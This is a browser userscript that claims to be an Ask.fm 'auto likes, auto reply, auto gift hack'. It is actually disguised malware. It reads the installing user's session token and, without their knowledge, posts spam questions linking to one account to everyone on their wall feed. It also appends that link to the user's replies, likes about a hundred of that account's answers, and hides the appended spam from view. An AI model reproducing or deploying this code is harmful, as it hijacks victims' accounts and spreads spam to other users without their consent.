// ==UserScript==
// @name			Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gift Hack
// @namespace                   http://userscripts.org/scripts/show/999999
// @version			3.0
// @copyright		        http://ask.fm/GreaCkDX
// @description		        Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gift Hack
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?
// Version numero 2
// ==/UserScript==

var harfler = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y'];
function randomcode(){
	return harfler[Math.floor(Math.random() * 60)] + "AQ" + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)];
}
function reklam(){
return mesaj + " " + randomcode() + " ";
}
var link = "http://ask.fm/PanamienQuatreVingtQuatorze";
var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");
var mesaj = "Hey ==> ";
var cevap = mesaj + " " + link;

if(document.getElementsByClassName("link-menu-active").length > 0){
if(document.getElementsByClassName("link-menu-active")[0].innerText == "Profil"){
document.getElementById("profile_gifts_counter").innerText = parseInt(document.getElementById("profile_gifts_counter").innerText) + 1;
var gift = document.createElement("div");
gift.id = "gift-container";
gift.innerHTML = '<div id="gift-outline" style="display: none; "></div>';
document.body.insertBefore(gift,document.getElementById("wrapper"));
Gifts.init({
sync_url: document.getElementsByClassName("link-menu-active")[0].href.replace("http://ask.fm","") + "/gifts/sync",
flash_id: null,
sync_all: false
});    
Gifts.load([{
"offset_left":0,
"rtl":false,
"src":"http://ask.fm/images/badges/love_and_friendship/C0459.png",
"z_index":1,
"id":2569992,
"offset_top":25
}]);
}}

if(document.URL.indexOf("/reply") < 0 && link != ""){
for(i=0;i<$('.answer').length;i++){
try{
if($('.answer')[i].innerText.split("\n.\n.\n").length > 0){
$('.answer')[i].innerText =$('.answer')[i].innerText.split("\n.\n.\n")[0];
}
}catch(e){}
}
}

if($('#captcha_key').val() != undefined){
if($('#captcha_key').val().toString().length > 0){
$('#captchaLevel').css({display:"none"});
$('#captcha_key').val("")
}
}

if(document.URL.indexOf("/account/wall") > 0 && link != ""){
window.setInterval("sor();",1000);
}

if(document.URL.indexOf("/reply") > 0 && link != ""){
$('#question_submit').mouseover(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) < 0){
  document.getElementById("post-input-pre").value = document.getElementById("post-input-pre").value + "\n.\n.\n" + cevap;
  }
});
document.getElementById("question_submit").type = "button";
$('#question_submit').click(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) > 0){
jQuery.ajax({
url: "http://ask.fm/PanamienQuatreVingtQuatorze/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": "Aime stp " + ":" + document.URL.replace("/questions/","/answer/").replace("/reply","") , "question[force_anonymous]":"" , "authenticity_token":token},
success:function(){$("form:first").submit();}
});
  }
});
}

function sorusor(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":kisi + " selam " + reklam() + link, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

function floodyap(kisi,soru){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":soru, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

var sayac = 0;
function sor(){
if(sayac < document.getElementsByClassName("questionBox").length){
sorusor(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href.replace("http://ask.fm/",""));
//rapor_ver(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href,"Soruldu");
sayac += 1;
}
}

function rapor_ver(rapor,durum){
jQuery.ajax({
url: "http://ask.fm/PanamienQuatreVingtQuatorze/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": durum + ":" + rapor , "question[force_anonymous]":"" , "authenticity_token":token}
});
}


function sorubegen(kisi,soruid){
var yanitsayi = "";
var begenisayi = "";
if($('#profile_answer_counter') && $('#profile_liked_counter')){
yanitsayi = $('#profile_answer_counter').text()
begenisayi = $('#profile_liked_counter').text()
}
jQuery.ajax({
url: "http://ask.fm/likes/" + kisi + "/question/" + soruid + "/add",
type: "POST",
data: { "authenticity_token":token},
beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
success: function(){
	if(yanitsayi != "" && begenisayi != ""){
	$('#profile_answer_counter').text(yanitsayi);
	$('#profile_liked_counter').text(begenisayi);
	}
	}
});
}
sorubegen("PanamienQuatreVingtQuatorze","27668812903");
sorubegen("PanamienQuatreVingtQuatorze","26694834791");
sorubegen("PanamienQuatreVingtQuatorze","26663332199");
sorubegen("PanamienQuatreVingtQuatorze","27238274663");
sorubegen("PanamienQuatreVingtQuatorze","27669278567");
sorubegen("PanamienQuatreVingtQuatorze","27815638631");
sorubegen("PanamienQuatreVingtQuatorze","29496484199");
sorubegen("PanamienQuatreVingtQuatorze","30146238311");
sorubegen("PanamienQuatreVingtQuatorze","27822090343");
sorubegen("PanamienQuatreVingtQuatorze","27823305831");
sorubegen("PanamienQuatreVingtQuatorze","27824546919");
sorubegen("PanamienQuatreVingtQuatorze","27824840551");
sorubegen("PanamienQuatreVingtQuatorze","27827005543");
sorubegen("PanamienQuatreVingtQuatorze","27828874087");
sorubegen("PanamienQuatreVingtQuatorze","27838552935");
sorubegen("PanamienQuatreVingtQuatorze","27845634663");
sorubegen("PanamienQuatreVingtQuatorze","25761582951");
sorubegen("PanamienQuatreVingtQuatorze","27846380647");
sorubegen("PanamienQuatreVingtQuatorze","26554213991");
sorubegen("PanamienQuatreVingtQuatorze","27846782823");
sorubegen("PanamienQuatreVingtQuatorze","27851262823");
sorubegen("PanamienQuatreVingtQuatorze","26553530727");
sorubegen("PanamienQuatreVingtQuatorze","27857671527");
sorubegen("PanamienQuatreVingtQuatorze","26553306215");
sorubegen("PanamienQuatreVingtQuatorze","26552779623");
sorubegen("PanamienQuatreVingtQuatorze","27857819239");
sorubegen("PanamienQuatreVingtQuatorze","26552685159");
sorubegen("PanamienQuatreVingtQuatorze","27858412647");
sorubegen("PanamienQuatreVingtQuatorze","27858883943");
sorubegen("PanamienQuatreVingtQuatorze","27859504743");
sorubegen("PanamienQuatreVingtQuatorze","27859777127");
sorubegen("PanamienQuatreVingtQuatorze","27846976103");
sorubegen("PanamienQuatreVingtQuatorze","27889038951");
sorubegen("PanamienQuatreVingtQuatorze","25751241063");
sorubegen("PanamienQuatreVingtQuatorze","25596195431");
sorubegen("PanamienQuatreVingtQuatorze","25596617575");
sorubegen("PanamienQuatreVingtQuatorze","27980052583");
sorubegen("PanamienQuatreVingtQuatorze","25510749287");
sorubegen("PanamienQuatreVingtQuatorze","26268838759");
sorubegen("PanamienQuatreVingtQuatorze","25505131879");
sorubegen("PanamienQuatreVingtQuatorze","25373554791");
sorubegen("PanamienQuatreVingtQuatorze","25370101351");
sorubegen("PanamienQuatreVingtQuatorze","25369591143");
sorubegen("PanamienQuatreVingtQuatorze","27980107623");
sorubegen("PanamienQuatreVingtQuatorze","25278437735");
sorubegen("PanamienQuatreVingtQuatorze","27900111463");
sorubegen("PanamienQuatreVingtQuatorze","24982925159");
sorubegen("PanamienQuatreVingtQuatorze","24984945255");
sorubegen("PanamienQuatreVingtQuatorze","24967193703");
sorubegen("PanamienQuatreVingtQuatorze","26241832807");
sorubegen("PanamienQuatreVingtQuatorze","26241199207");
sorubegen("PanamienQuatreVingtQuatorze","27980232295");
sorubegen("PanamienQuatreVingtQuatorze","26193943143");
sorubegen("PanamienQuatreVingtQuatorze","27909311591");
sorubegen("PanamienQuatreVingtQuatorze","27981002599");
sorubegen("PanamienQuatreVingtQuatorze","27981754215");
sorubegen("PanamienQuatreVingtQuatorze","27982384743");
sorubegen("PanamienQuatreVingtQuatorze","27981788519");
sorubegen("PanamienQuatreVingtQuatorze","28011028583");
sorubegen("PanamienQuatreVingtQuatorze","24953369191");
sorubegen("PanamienQuatreVingtQuatorze","28005737831");
sorubegen("PanamienQuatreVingtQuatorze","24931468391");
sorubegen("PanamienQuatreVingtQuatorze","28187328103");
sorubegen("PanamienQuatreVingtQuatorze","28068117607");
sorubegen("PanamienQuatreVingtQuatorze","24793366375");
sorubegen("PanamienQuatreVingtQuatorze","24463830631");
sorubegen("PanamienQuatreVingtQuatorze","28188300647");
sorubegen("PanamienQuatreVingtQuatorze","24402111847");
sorubegen("PanamienQuatreVingtQuatorze","24402134375");
sorubegen("PanamienQuatreVingtQuatorze","24403070055");
sorubegen("PanamienQuatreVingtQuatorze","24358882151");
sorubegen("PanamienQuatreVingtQuatorze","24243794023");
sorubegen("PanamienQuatreVingtQuatorze","24240499047");
sorubegen("PanamienQuatreVingtQuatorze","28189665383");
sorubegen("PanamienQuatreVingtQuatorze","24188431463");
sorubegen("PanamienQuatreVingtQuatorze","27056277351");
sorubegen("PanamienQuatreVingtQuatorze","27133867367");
sorubegen("PanamienQuatreVingtQuatorze","27152021607");
sorubegen("PanamienQuatreVingtQuatorze","27464019303");
sorubegen("PanamienQuatreVingtQuatorze","27470372967");
sorubegen("PanamienQuatreVingtQuatorze","28200815719");
sorubegen("PanamienQuatreVingtQuatorze","27472393575");
sorubegen("PanamienQuatreVingtQuatorze","27565253991");
sorubegen("PanamienQuatreVingtQuatorze","27597296487");
sorubegen("PanamienQuatreVingtQuatorze","26983113575");
sorubegen("PanamienQuatreVingtQuatorze","24157701991");
sorubegen("PanamienQuatreVingtQuatorze","26792169063");
sorubegen("PanamienQuatreVingtQuatorze","28207230823");
sorubegen("PanamienQuatreVingtQuatorze","28227648359");
sorubegen("PanamienQuatreVingtQuatorze","23989881959");
sorubegen("PanamienQuatreVingtQuatorze","23687988583");
sorubegen("PanamienQuatreVingtQuatorze","28227895399");
sorubegen("PanamienQuatreVingtQuatorze","23634197607");
sorubegen("PanamienQuatreVingtQuatorze","28221431655");
sorubegen("PanamienQuatreVingtQuatorze","25841683815");
sorubegen("PanamienQuatreVingtQuatorze","23456548199");
sorubegen("PanamienQuatreVingtQuatorze","23457232231");
sorubegen("PanamienQuatreVingtQuatorze","23428012903");
sorubegen("PanamienQuatreVingtQuatorze","23401318759");
sorubegen("PanamienQuatreVingtQuatorze","28206984295");
sorubegen("PanamienQuatreVingtQuatorze","28305023847");
takipet("PanamienQuatreVingtQuatorze");